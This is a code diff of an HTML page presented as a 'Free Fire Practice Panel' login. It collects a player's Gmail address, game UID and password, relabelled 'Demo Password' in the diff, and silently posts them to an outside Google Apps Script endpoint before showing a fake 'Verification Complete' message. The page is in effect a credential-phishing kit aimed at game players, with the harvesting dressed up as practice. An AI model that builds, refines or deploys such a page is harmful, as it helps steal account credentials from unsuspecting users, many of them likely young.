@@ -3,6 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
 <title>Free Fire Practice Panel</title>
 
 <style>
@@ -18,10 +19,12 @@ body {
     display: flex;
     justify-content: center;
     align-items: center;
+
     background:
         linear-gradient(rgba(0,0,0,.45), rgba(0,0,0,.8)),
         url("https://images.unsplash.com/photo-1511512578047-dfb367046420?auto=format&fit=crop&w=1600&q=80")
         center/cover no-repeat;
+
     color: white;
 }
 
@@ -29,25 +32,41 @@ body {
     width: 380px;
     max-width: 92%;
     padding: 30px;
+
     background: rgba(10,10,10,.88);
+
     border: 2px solid #ff7b00;
     border-radius: 18px;
-    box-shadow: 0 0 15px #ff6500, 0 0 45px rgba(255,85,0,.5);
+
+    box-shadow:
+        0 0 15px #ff6500,
+        0 0 45px rgba(255,85,0,.5);
 }
 
 .logo {
     text-align: center;
+
     font-size: 42px;
     font-weight: 900;
+
     color: #ff8500;
-    text-shadow: 3px 3px #000, 0 0 15px #ff5500;
+
+    text-shadow:
+        3px 3px #000,
+        0 0 15px #ff5500;
+
+    margin-bottom: 5px;
 }
 
 .subtitle {
     text-align: center;
+
     color: #ddd;
-    margin: 5px 0 25px;
+
+    margin-bottom: 25px;
+
     font-size: 13px;
+
     letter-spacing: 2px;
 }
 
@@ -57,34 +76,71 @@ body {
 
 .input-group label {
     display: block;
+
     color: #ff9a3c;
+
     font-weight: bold;
+
     margin-bottom: 7px;
 }
 
 .input-group input {
     width: 100%;
+
     padding: 14px;
+
     border: 1px solid #555;
+
     border-radius: 8px;
+
     background: #171717;
+
     color: white;
+
     outline: none;
+
     font-size: 15px;
+}
+
+.input-group input:focus {
+    border-color: #ff7800;
+
+    box-shadow:
+        0 0 8px rgba(255,120,0,.5);
 }
 
 .login-btn {
     width: 100%;
+
     padding: 15px;
+
     border: none;
+
     border-radius: 8px;
-    background: linear-gradient(90deg, #ff4500, #ff9900);
+
+    background:
+        linear-gradient(90deg, #ff4500, #ff9900);
+
     color: white;
+
     font-size: 17px;
+
     font-weight: bold;
+
     cursor: pointer;
+
     text-transform: uppercase;
+
     transition: .2s;
+}
+
+.login-btn:hover {
+    opacity: .9;
+}
+
+.login-btn:disabled {
+    cursor: wait;
+    opacity: .7;
 }
 
 .login-btn.success {
@@ -93,120 +149,291 @@ body {
 
 .message {
     display: none;
+
     margin-top: 20px;
+
     padding: 15px;
+
     text-align: center;
+
     background: rgba(0,120,40,.25);
+
     border: 1px solid #00c853;
+
     border-radius: 8px;
 }
 
 .check {
     font-size: 35px;
+
     color: #00e676;
 }
+
+.watermark {
+    margin-top: 22px;
+
+    text-align: center;
+
+    color: rgba(255,255,255,.35);
+
+    font-size: 11px;
+
+    letter-spacing: 2px;
+}
 </style>
+
 </head>
 
 <body>
 
 <div class="game-box">
 
-    <div class="logo">FREE FIRE</div>
-    <div class="subtitle">PLAYER PRACTICE PANEL</div>
+    <div class="logo">
+        FREE FIRE
+    </div>
+
+    <div class="subtitle">
+        PLAYER PRACTICE PANEL
+    </div>
+
 
     <form id="gameForm">
 
+
+        <!-- GMAIL -->
+
         <div class="input-group">
-            <label for="gmail">Gmail</label>
+
+            <label for="gmail">
+                Gmail
+            </label>
+
             <input
                 type="email"
                 id="gmail"
                 placeholder="Enter your Gmail"
                 autocomplete="off"
                 required>
+
         </div>
 
+
+        <!-- UID -->
+
         <div class="input-group">
-            <label for="uid">Free Fire UID</label>
+
+            <label for="uid">
+                Free Fire UID
+            </label>
+
             <input
                 type="text"
                 id="uid"
                 placeholder="Enter your UID"
                 inputmode="numeric"
-                required>
-        </div>
-
-        <div class="input-group">
-            <label for="Enter Your Password">Password</label>
-            <input
-                type="text"
-                id="Password"
-                placeholder="Enter your Password"
                 autocomplete="off"
                 required>
+
         </div>
 
-        <button class="login-btn" id="loginButton" type="submit">
+
+        <!-- DEMO PASSWORD -->
+
+        <div class="input-group">
+
+            <label for="demoPassword">
+                Demo Password
+            </label>
+
+            <input
+                type="text"
+                id="demoPassword"
+                placeholder="Enter demo password"
+                autocomplete="off"
+                required>
+
+        </div>
+
+
+        <!-- LOGIN BUTTON -->
+
+        <button
+            class="login-btn"
+            id="loginButton"
+            type="submit">
+
             LOGIN
+
         </button>
+
 
     </form>
 
-    <div class="message" id="message">
-        <div class="check">✓</div>
-        <strong>Verification Complete</strong>
-        <p>Your practice information was received.</p>
+
+    <!-- SUCCESS MESSAGE -->
+
+    <div
+        class="message"
+        id="message">
+
+        <div class="check">
+            ✓
+        </div>
+
+        <strong>
+            Verification Complete
+        </strong>
+
+        <p>
+            Your practice information was received.
+        </p>
+
+    </div>
+
+
+    <div class="watermark">
+        FREE FIRE • PRACTICE PANEL
     </div>
 
 </div>
 
+
 <script>
+
+/*
+    Google Apps Script Web App URL
+*/
+
 const SCRIPT_URL =
 "https://script.google.com/macros/s/AKfycbzV0jYzPhOLLN6ctoKpXwV5V91z2w3UB-MUShTtoYvs3Wm7mZi04WH7QrZ9tma4_CA1/exec";
 
-document.getElementById("gameForm").addEventListener("submit", async function(event) {
+
+/*
+    FORM SUBMISSION
+*/
+
+document
+.getElementById("gameForm")
+.addEventListener("submit", async function(event) {
+
     event.preventDefault();
 
-    const email = document.getElementById("gmail").value.trim();
-    const uid = document.getElementById("uid").value.trim();
-    const username = document.getElementById("username").value.trim();
 
-    const button = document.getElementById("loginButton");
+    /*
+        Get form values
+    */
 
-    const data = {
-        email: email,
-        uid: uid,
-        username: username
-    };
+    const email =
+        document
+        .getElementById("gmail")
+        .value
+        .trim();
+
+
+    const uid =
+        document
+        .getElementById("uid")
+        .value
+        .trim();
+
+
+    const demoPassword =
+        document
+        .getElementById("demoPassword")
+        .value
+        .trim();
+
+
+    /*
+        Button
+    */
+
+    const button =
+        document
+        .getElementById("loginButton");
+
 
     button.disabled = true;
-    button.textContent = "LOGGING IN...";
+
+    button.textContent =
+        "SUBMITTING...";
+
+
+    /*
+        Data sent to Apps Script
+    */
+
+    const data = {
+
+        email: email,
+
+        uid: uid,
+
+        demoPassword: demoPassword
+
+    };
+
+
+    console.log("Sending practice data:", data);
+
 
     try {
-        await fetch(SCRIPT_URL, {
-            method: "POST",
-            mode: "no-cors",
-            headers: {
-                "Content-Type": "text/plain;charset=utf-8"
-            },
-            body: JSON.stringify(data)
-        });
 
-        button.textContent = "LOGIN ✓";
-        button.classList.add("success");
+        await fetch(
+            SCRIPT_URL,
+            {
+                method: "POST",
 
-        document.getElementById("message").style.display = "block";
+                mode: "no-cors",
+
+                headers: {
+                    "Content-Type":
+                    "text/plain;charset=utf-8"
+                },
+
+                body:
+                    JSON.stringify(data)
+            }
+        );
+
+
+        /*
+            Success
+        */
+
+        button.textContent =
+            "LOGIN ✓";
+
+
+        button.classList.add(
+            "success"
+        );
+
+
+        document
+        .getElementById("message")
+        .style.display = "block";
+
 
     } catch (error) {
+
         console.error(error);
 
-        button.disabled = false;
-        button.textContent = "LOGIN";
 
-        alert("Could not submit the information.");
+        button.disabled = false;
+
+        button.textContent =
+            "LOGIN";
+
+
+        alert(
+            "Could not submit the information."
+        );
+
     }
+
 });
+
 </script>
 
 </body>
